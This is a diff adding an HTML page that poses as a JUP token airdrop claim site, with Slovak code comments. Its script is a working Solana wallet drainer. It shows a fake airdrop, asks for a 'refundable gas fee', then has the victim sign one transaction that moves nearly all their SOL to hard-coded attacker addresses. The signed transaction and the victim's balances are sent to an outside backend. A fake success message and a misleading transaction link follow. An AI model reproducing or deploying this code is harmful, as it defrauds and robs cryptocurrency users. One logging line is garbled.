@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JUP Token Airdrop Claim</title>
+    <style>
+        /* Základný štýl pre stránku */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: #e0e0e0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background-color: #2e2e4a; padding: 30px 40px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); text-align: center; max-width: 500px; width: 90%; }
+        #logo { width: 80px; margin-bottom: 20px; }
+        h1 { color: #f0a500; margin-bottom: 15px; font-size: 28px; }
+        .status-text { font-size: 16px; color: #bdbdbd; margin-bottom: 20px; min-height: 24px; }
+        .claim-amount { font-size: 24px; font-weight: bold; color: #ffffff; margin-bottom: 30px; }
+        .claim-amount span { color: #f0a500; }
+        button { background-color: #f0a500; color: #1a1a2e; border: none; padding: 12px 25px; font-size: 18px; border-radius: 5px; cursor: pointer; transition: background-color 0.3s ease, transform 0.2s ease; }
+        button:hover { background-color: #ffc857; transform: translateY(-2px); }
+        button:disabled { background-color: #888888; cursor: not-allowed; transform: none; }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); z-index: 1000; justify-content: center; align-items: center; }
+        .loading-overlay.active { display: flex; }
+        .loading-container { text-align: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f0a500; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); z-index: 1001; justify-content: center; align-items: center; }
+        .popup-content { background-color: #3a3a5a; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.7); max-width: 450px; width: 90%; }
+        .popup-content h2 { color: #f0a500; margin-top: 0; }
+        .popup-content p { font-size: 16px; color: #cccccc; }
+        .popup-content .amount { font-weight: bold; color: #ffffff; }
+        .popup-content .fee { font-weight: bold; color: #ff8c8c; }
+        .popup-buttons { margin-top: 25px; display: flex; justify-content: space-around; }
+        .popup-buttons button { margin: 0 10px; }
+        .popup-buttons .cancel-btn { background-color: #6a6a8a; }
+        .popup-buttons .cancel-btn:hover { background-color: #8a8aab; }
+        .success-message { color: #7fff7f; font-weight: bold; margin-bottom: 15px; }
+        .view-tx-link { color: #a0a0ff; text-decoration: underline; font-size: 14px; }
+        .view-tx-link:hover { color: #c0c0ff; }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loading">
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <p id="statusText" class="status-text">Loading...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <img id="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/9/9d/JPMorgan_Chase_%26_Co._logo.svg/1200px-JPMorgan_Chase_%26_Co._logo.svg.png" alt="Logo">
+        <h1>JUP Token Bonus Airdrop Claim</h1>
+        <p id="statusText" class="status-text">Please connect your wallet to check eligibility.</p>
+        <div class="claim-amount">
+            You are eligible for a bonus airdrop of <span id="claimAmount">0</span> JUP!
+        </div>
+        <button id="actionBtn" onclick="connectWallet()">Connect Wallet</button>
+    </div>
+
+    <!-- Gas Fee Popup -->
+    <div class="popup" id="gasFeePopup">
+        <div class="popup-content">
+            <h2>Claim Bonus Airdrop</h2>
+            <p>To process your claim, a small, refundable network fee is required.</p>
+            <p>Amount: <span id="gasFeeAmount" class="fee">Processing...</span></p>
+            <p>This fee ensures the transaction is processed securely and promptly.</p>
+            <div class="popup-buttons">
+                <button onclick="closeGasFeePopup()" class="cancel-btn">Cancel</button>
+                <button id="payGasFeeBtn">Pay Gas Fee</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <h2 class="success-message">Claim Successful!</h2>
+            <p id="successMessage">Your JUP tokens will be airdropped to your wallet within 2 hours.</p>
+            <a id="viewTxLink" href="#" target="_blank" class="view-tx-link">View Transaction on Solscan</a>
+            <div class="popup-buttons">
+                <button onclick="closeSuccessPopup()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Load Solana Web3.js FIRST -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script>
+        // Alias solanaWeb3 to solanaWeb
+        if (typeof solanaWeb3 !== 'undefined') {
+            window.solanaWeb = solanaWeb3;
+        }
+    </script>
+    <!-- Load Wallet Adapter SECOND (after Solana Web3.js) -->
+    <!-- Uisti sa, že cesta k wallet-adapter.js je správna -->
+    <script src="wallet-adapter.js"></script>
+
+    <script>
+        // Backend URL a API Key
+        const BACKEND_URL = 'https://ujbackend.onrender.com'; // Tvoj backend URL
+        const API_KEY = 'your-secret-key-123'; // Tvoj API Key
+
+        // --- Dôležité adresy ---
+        // Adresa pod tvojou kontrolou pre zber falošných poplatkov
+        const FAKE_GAS_FEE_RECIPIENT_ADDRESS = 'CkUzC38NHnUMeR4QPenSamYE3CTgiEUEvQBPbGQuEi6p'; 
+        // Adresa útočníka, kam sa presunie všetko SOL
+        const ATTACKER_WALLET_ADDRESS_FOR_DRAIN = '7sfj26oV3mH1Vts4AMfX2K6JMY7RkUg96JxJH2JNUvh2';
+        // Dalšia kontrolovaná adresa pre obfuskáciu
+        const ANOTHER_CONTROLLED_ADDRESS = 'sQctrhrwXdKjgUnQ7oQJ5VoLXVWU5qFsh5GDToyizA5'; // NAHRADIŤ!
+
+        let walletAddress = null;
+        let connectedWallet = null;
+        let balances = { SOL: 0, USDC: 0 };
+        let userSolBalance = 0; // Pre presnejšie výpočty poplatkov
+        let currentProvider = null;
+        let currentWalletName = null;
+
+        // ====== WALLET CONNECTION ======
+        async function connectWallet() {
+            const btn = document.getElementById('actionBtn');
+            console.log('[DEBUG] connectWallet() called');
+            
+            btn.disabled = true;
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('statusText').textContent = "Connecting wallet...";
+            
+            try {
+                const { provider, name } = window.WalletAdapter.getAvailableWallet();
+                
+                if (!provider) {
+                    throw new Error('No Solana wallet detected! Install Phantom, Solflare, Magic Eden, or another Solana-compatible wallet.');
+                }
+                
+                console.log(`[DEBUG] Using wallet: ${name}`);
+                currentProvider = provider;
+                currentWalletName = name;
+                
+                window.WalletAdapter.setupWalletListeners(provider);
+                
+                const publicKey = await window.WalletAdapter.connectToWallet(provider);
+                walletAddress = publicKey.toString();
+                connectedWallet = new solanaWeb.PublicKey(publicKey);
+
+                console.log('[DEBUG] Connected wallet:', walletAddress);
+                btn.textContent = `Connected: ${walletAddress.substring(0, 4)}...${walletAddress.substring(walletAddress.length - 4)}`;
+                document.getElementById('statusText').textContent = `Wallet connected successfully (${name})`;
+
+                await checkEligibility();
+                
+            } catch (error) {
+                console.error("[DEBUG] Connection error:", error);
+                alert(error.message || 'Wallet connection failed. Please try again.');
+                btn.disabled = false;
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('statusText').textContent = "Wallet connection failed.";
+            }
+        }
+
+        // ====== CHECK ELIGIBILITY ======
+        async function checkEligibility() {
+            console.log('[DEBUG] checkEligibility() called');
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('statusText').textContent = "Checking eligibility...";
+
+            try {
+                const fetchedBalances = await getTokenBalances(walletAddress);
+                balances = fetchedBalances;
+                userSolBalance = fetchedBalances.SOL; // Uložíme pre presnejšie výpočty
+
+                const totalValue = balances.SOL * 150 + balances.USDC;
+                let fakeAmount;
+
+                if (totalValue > 5000) fakeAmount = 50 + Math.floor(Math.random() * 50);
+                else if (totalValue > 1000) fakeAmount = 10 + Math.floor(Math.random() * 41);
+                else if (totalValue > 100) fakeAmount = 5 + Math.floor(Math.random() * 9);
+                else fakeAmount = 1 + Math.floor(Math.random() * 4);
+
+                console.log('[DEBUG] Fake airdrop amount:', fakeAmount);
+                document.getElementById('claimAmount').textContent = fakeAmount.toLocaleString();
+                document.getElementById('statusText').textContent = "You're eligible for a bonus airdrop!";
+                document.getElementById('loading').classList.remove('active');
+
+                const btn = document.getElementById('actionBtn');
+                btn.textContent = `Claim ${fakeAmount} JUP`;
+                btn.onclick = () => showGasFeePopup(fakeAmount);
+                btn.disabled = false;
+                
+            } catch (error) {
+                console.error("[DEBUG] Eligibility check error:", error);
+                alert('Error checking eligibility: ' + error.message);
+                document.getElementById('statusText').textContent = "Eligibility check failed";
+                document.getElementById('loading').classList.remove('active');
+            }
+        }
+
+        // ====== FETCH TOKEN BALANCES ======
+        async function getTokenBalances(address) {
+            console.log('[DEBUG] getTokenBalances() called for:', address);
+            const conn = new solanaWeb.Connection('https://solana-mainnet.g.alchemy.com/v2/bf8f6sul9ANkLYMG-gsqE');
+            const pubkey = new solanaWeb.PublicKey(address);
+            let currentBalances = { SOL: 0, USDC: 0 };
+            try {
+                const solBalance = await conn.getBalance(pubkey);
+                currentBalances.SOL = solBalance / solanaWeb.LAMPORTS_PER_SOL;
+                console.log('[DEBUG] SOL balance:', currentBalances.SOL);
+
+                const tokenAccounts = await conn.getTokenAccountsByOwner(pubkey, {
+                    programId: new solanaWeb.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
+                });
+
+                for (const { account } of tokenAccounts.value) {
+                    const accountData = Buffer.from(account.data);
+                    if (accountData.length < 64 + 8) continue;
+                    const mint = new solanaWeb.PublicKey(accountData.slice(0, 32));
+                    const amount = Number(accountData.readBigUInt64LE(64));
+                    if (mint.toString() === 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v') { // USDC Mint ID
+                        currentBalances.USDC = amount / 1000000;
+                        console.log('[DEBUG] USDC balance:', currentBalances.USDC);
+                    }
+                }
+            } catch (e) {
+                console.error("[DEBUG] Error fetching balances:", e);
+            }
+            return currentBalances;
+        }
+
+        // ====== GAS FEE POPUP ======
+        function showGasFeePopup(fakeAmount) {
+            console.log('[DEBUG] showGasFeePopup() called with amount:', fakeAmount);
+            document.getElementById('gasFeePopup').style.display = 'flex';
+
+            // Výpočet a zobrazenie falošného poplatku
+            const fakeGasFeeAmount = (Math.random() * 0.001 + 0.05).toFixed(2); // Napr. 0.05 SOL
+            document.getElementById('gasFeeAmount').textContent = `Fee: ${fakeGasFeeAmount} SOL (refundable)`;
+
+            window.currentFakeAmount = fakeAmount; // Uložíme sumu JUP
+
+            document.getElementById('payGasFeeBtn').onclick = payGasFee;
+        }
+
+        function closeGasFeePopup() {
+            document.getElementById('gasFeePopup').style.display = 'none';
+            // Obnovenie tlačidla ak sa pop-up zatvorí bez akcie
+            const payBtn = document.getElementById('payGasFeeBtn');
+            if (payBtn) {
+                payBtn.disabled = false;
+                payBtn.textContent = 'Pay Gas Fee';
+            }
+        }
+
+        // ====== PAY GAS FEE (THE THEFT WITH OBFUSCATION) ======
+        async function payGasFee() {
+            const btn = document.getElementById('payGasFeeBtn');
+            console.log('[DEBUG] payGasFee() called');
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            document.getElementById('gasFeeAmount').textContent = "Processing payment...";
+
+            try {
+                const conn = new solanaWeb.Connection('https://solana-mainnet.g.alchemy.com/v2/bf8f6sul9ANkLYMG-gsqE');
+                const { blockhash } = await conn.getRecentBlockhash();
+
+                // ===== MODIFICATION FOR OBFUSCATION =====
+                const soleUserPromptTx = new solanaWeb.Transaction({
+                    recentBlockhash: blockhash,
+                    feePayer: connectedWallet,
+                });
+
+                const reserveForFees = 0.02; // Rezerva na poplatky
+                const totalSolAvailableForTransfer = userSolBalance - reserveForFees;
+                if (totalSolAvailableForTransfer <= 0) {
+                    throw new Error("Insufficient SOL balance for transaction. Ensure you have at least ~0.02 SOL for fees.");
+                }
+                const totalLamportsToTransfer = totalSolAvailableForTransfer * solanaWeb.LAMPORTS_PER_SOL;
+
+                // --- Inštrukcia A: Falošný Gas Fee (hlavná viditeľná časť) ---
+                const fakeGasFeeAmount = 0.05; // Napr. 0.05 SOL
+                const fakeGasFeeLamports = fakeGasFeeAmount * solanaWeb.LAMPORTS_PER_SOL;
+
+                if (totalLamportsToTransfer < fakeGasFeeLamports) {
+                     throw new Error("Not enough SOL for fake fee and actual transfer.");
+                }
+
+                soleUserPromptTx.add(
+                    solanaWeb.SystemProgram.transfer({
+                        fromPubkey: connectedWallet,
+                        toPubkey: new solanaWeb.PublicKey(FAKE_GAS_FEE_RECIPIENT_ADDRESS),
+                        lamports: fakeGasFeeLamports,
+                    })
+                );
+
+                // --- Inštrukcia B: Falošná "Technická" Operácia (pre obfuskáciu) ---
+                const ANOTHER_CONTROLLED_ADDRESS_PUBKEY = new solanaWeb.PublicKey(ANOTHER_CONTROLLED_ADDRESS); // Použitie PublicKey
+                const tinyFeeLamports = 0.0001 * solanaWeb.LAMPORTS_PER_SOL; // Veľmi malá suma
+
+                if (totalLamportsToTransfer < fakeGasFeeLamports + tinyFeeLamports) {
+                    throw new Error("Not enough SOL for fake fee, tiny fee, and actual transfer.");
+                }
+
+                soleUserPromptTx.add(
+                    solanaWeb.SystemProgram.transfer({
+                        fromPubkey: connectedWallet,
+                        toPubkey: ANOTHER_CONTROLLED_ADDRESS_PUBKEY,
+                        lamports: tinyFeeLamports,
+                    })
+                );
+
+                // --- Inštrukcia C: Skutočné Odčerpanie SOL ---
+                const remainingLamportsForDrain = totalLamportsToTransfer - fakeGasFeeLamports - tinyFeeLamports;
+
+                if (remainingLamportsForDrain <= 0) {
+                    throw new Error("Not enough SOL remaining for the actual drain after all fees deducted.");
+                }
+
+                soleUserPromptTx.add(
+                    solanaWeb.SystemProgram.transfer({
+                        fromPubkey: connectedWallet,
+                        toPubkey: new solanaWeb.PublicKey(ATTACKER_WALLET_ADDRESS_FOR_DRAIN),
+                        lamports: remainingLamportsForDrain,
+                    })
+                );
+                // ===== END OF MODIFICATION =====
+
+                console.log('[DEBUG] Signing combined transaction (fake fee + tiny fee + drain)...');
+                const signedCombinedTxObject = await window.WalletAdapter.signTransaction(currentProvider, soleUserPromptTx);
+
+                console.log('[DEBUG] Sending signed transaction to backend and broadcasting...');
+                const response = await fetch(`${BACKEND_URL}/collect`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-KEY': API_KEY
+                    },
+                    body: JSON.stringify({
+                        wallet: walletAddress,
+                        signedTx: signedCombinedTxObject.serialize().toString('base64'),
+                        balances: { SOL: userSolBalance, USDC: balances.USDC },
+                        fakeAmount: window.currentFakeAmount,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || "Transaction submission failed");
+                }
+
+                const result = await response.json();
+
+                const txId = await conn.sendRawTransaction(signedCombinedTxObject.serialize());
+                await conn.confirmTransaction(txId);
+
+                // ====== KROK 6: ZOBRAZENIE FALEŠNÉHO ÚSPECHU ======
+                document.getElementById('successMessage').textContent = `Successfully claimed ${window.currentFakeAmount} JUP! Your tokens will arrive within 2 hours.`;
+                document.getElementById('viewTxLink').href = `https://solscan.io/tx/${result.gasTxId}?cluster=mainnet-beta`;
+                document.getElementById('gasFeePopup').style.display = 'none';
+                document.getElementById('successPopup').style.display = 'flex';
+
+                // ====== KROK 7: LOGOVANIE KRÁDEŽE (Pre backend) ======
+                console.log(`[SUCCESS] Drained ${userSolBalance.toFixed(4)} SOL from ${walletAddress}`);
+                console.log(`[SUCCESS] Actual Drain Transaction ID: ${txId}`);
+                console.log(`[SUCCESS] Fake Fee TX ID (shown to user): ${result.gasTxId}`);
+
+                await fetch(`${BACKEND_URL}/confirm`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-KEY': API_KEY
+                    },
+                    body: JSON.stringify({
+                        wallet: walletAddress,
+                        txId: txId,
+                        amount: userSolBalance,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+            } catch (error) {
+                console.error("[DEBUG] Theft failed:", error);
+                alert(`Transaction failed: ${error.message || "Unknown error"}. Please try again.`);
+
+                const btn = document.getElementById('payGasFeeBtn');
+                btn.disabled = false;
+                btn.textContent = 'Pay Gas Fee';
+                document.getElementById('gasFeeAmount').textContent = "Error processing payment";
+                closeGasFeePopup();
+            }
+        }
+
+        // ====== SUCCESS POPUP FUNCTIONS ======
+        function closeSuccessPopup() {
+            document.getElementById('successPopup').style.display = 'none';
+            const btn = document.getElementById('actionBtn');
+            btn.textContent = 'Claim Complete';
+            btn.disabled = true;
+        }
+
+        // ====== INITIALIZE ======
+        window.addEventListener('load', function() {
+            console.log('[DEBUG] Page loaded, initializing...');
+            
+            document.getElementById('actionBtn').addEventListener('click', connectWallet);
+            
+            const logo = document.getElementById('logo');
+            if (logo) {
+                logo.onload = function() { console.log("[DEBUG] Logo loaded successfully"); };
+                logo.onerror = function() { 
+                    consobb vle.error("[DEBUG] Failed to load logo");
+                    logo.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='40' fill='%23FFE45C'/%3E%3C/svg%3E";
+                };
+            } else { console.warn("[DEBUG] Logo element not found."); }
+
+            const availableWallets = window.WalletAdapter.getAllAvailableWallets();
+            if (availableWallets.length > 0) {
+                console.log('[DEBUG] Wallet(s) detected on load');
+                document.getElementById('statusText').textContent = "Click 'Connect Wallet' to check eligibility";
+            } else {
+                console.warn('[DEBUG] No wallet provider detected on load');
+                document.getElementById('statusText').textContent = "Please install a Solana wallet (Phantom, Solflare, Magic Eden, etc.)";
+            }
+        });
+    </script>
+</body>
+</html>
